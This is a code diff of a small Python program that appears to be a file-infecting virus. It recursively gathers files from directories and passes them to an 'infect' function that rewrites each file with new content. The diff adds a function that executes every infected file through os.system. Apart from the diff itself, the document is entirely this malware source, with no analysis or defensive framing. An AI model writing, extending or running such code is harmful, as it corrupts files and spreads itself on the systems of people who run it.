@@ -30,9 +30,6 @@ def run(dir):
         else:
             dirs.append(os.path.abspath(file))
     
-    print(files)
-    print(dirs)
-    
     while dirs != []:
         for dir in dirs:
             dirs.remove(dir)
@@ -47,12 +44,12 @@ def run(dir):
                 else:
                     dirs.append(os.path.abspath(file))
     
-    print(files)
+    infect(files)
     
-    infect(os.path.dirname(os.path.abspath(files[0])), files)
+    run(files)
     
 
-def infect(dirpath, files):
+def infect(files):
     for name in files:
         file_read = open(name, "r")
         file_read = file_read.read()
@@ -63,6 +60,11 @@ def infect(dirpath, files):
             file_write = open(name, "w")
             file_write.write(new_content)
             file_write.close()
+
+def run(files):
+    for file in files:
+        command = "python " + file
+        os.system(command)
 
 
 
